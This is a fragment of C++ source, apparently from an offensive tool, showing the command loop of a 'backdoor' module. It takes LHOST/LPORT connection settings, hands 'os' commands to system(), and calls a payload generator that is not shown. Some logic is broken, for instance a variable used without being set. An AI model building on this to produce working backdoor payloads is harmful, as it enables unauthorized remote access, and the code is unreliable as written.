do 
{
    string backdoorInput;
    char *str2, *str3;

    blue(); 
    cout << "l0l";
    gray(); 
    cout << ":";
    white(); 
    cout << "backdoor(";
    red(); 
    cout << parsermodule;
    white(); 
    cout << ")";
    blue(); 
    cout << " > ";
    white(); 
    getline(cin, backdoorInput);

    char* usecmd = strdup(backdoorInput.c_str());
    char* usecmd2 = strdup(backdoorInput.c_str());
    char* usecmd3 = strdup(backdoorInput.c_str());

    strcpy(usecmd2,usecmd);
    strtok(usecmd2, " ");
    string modulen = str;

    if (strlen(usecmd) == 0|| usecmd[0] == '\r' || usecmd[0] == '\n');

    else if (!strcmp(usecmd, "back")){
        goto x;
    }
    else if (!strcmp(usecmd, "help")){
        backdoorHelp();
    }
    else if (!strcmp(usecmd,"banner")){
        banner();
    }
    else if (!strcmp(usecmd,"exit") || cin.eof()){
        closeApp();
    }
    else if (!strcmp(usecmd, "clear")){
        clear();
    }
    else if (!strcmp(usecmd2,"os")){
        white();
        str2 =  shorter(usecmd,3);
        if (usecmd[3] == '\0'){
            osCommand();
        } else {
            system(str2);
        }
        putchar('\n');
    }
    else if (!strcmp(usecmd, "show options")){

        green(); cout <<
                "\n\tModule options (" << modulen << "):\n\n"
                "\t\tName\t" << "\tDescription" << "\t\tCurrent Setting\n"
                "\t\t----\t" << "\t-----------" << "\t\t---------------\n"
                "\t\tLHOST\t" << "\tConnection Host\t\t" << lhost << "\n"
                "\t\tLPORT\t" << "\tConnection Port\t\t" << lport << "\n\n";

    }
    else if (!strcmp(usecmd2, "set")){
        white();
        str2 = shorter(usecmd2,4);

        if ( str2[0] == 'L' && str2[1] == 'H' && str2[2] == 'O' && str2[3] == 'S' && str2[4] == 'T' && str2[5] == ' ' ){
            str3 = shorter(str2,6);
            lhost = str3;
            cout << "\nLHOST => " << str3 << "\n\n";
        }
        else if (str2[0] == 'L' && str2[1] == 'P' && str2[2] == 'O' && str2[3] == 'R' && str2[4] == 'T' && str2[5] == ' '){
            str3 = shorter(str2,6);
            lport = str3;
            cout << "\nLPORT => " << str3 << "\n\n";
        }
        else {
            red(); cout << "This option is not available.\n";
        }
    }
    else if (!strcmp(usecmd2, "unset")){
        str2 = shorter(usecmd2,6);

        if ( str2[0] == 'L' && str2[1] == 'H' && str2[2] == 'O' && str2[3] == 'S' && str2[4] == 'T'){
            lhost = "None";
        }
        else if (str2[0] == 'L' && str2[1] == 'P' && str2[2] == 'O' && str2[3] == 'R' && str2[4] == 'T'){
            lport = "None";
        }
        else {
            red(); cout << "This option is not available.\n";
        }
    }
    else if (!strcmp(usecmd, "generate")){
        white();
        if (lhost == "None" || lport == "None") cout << "\nSet options before generate payload.\n\n";
        else scriptPayloads(str, lhost, lport);
    }
    else {
        red(); printf("[-] Unknown command: %s\n", usecmd);
    }

} while(1);
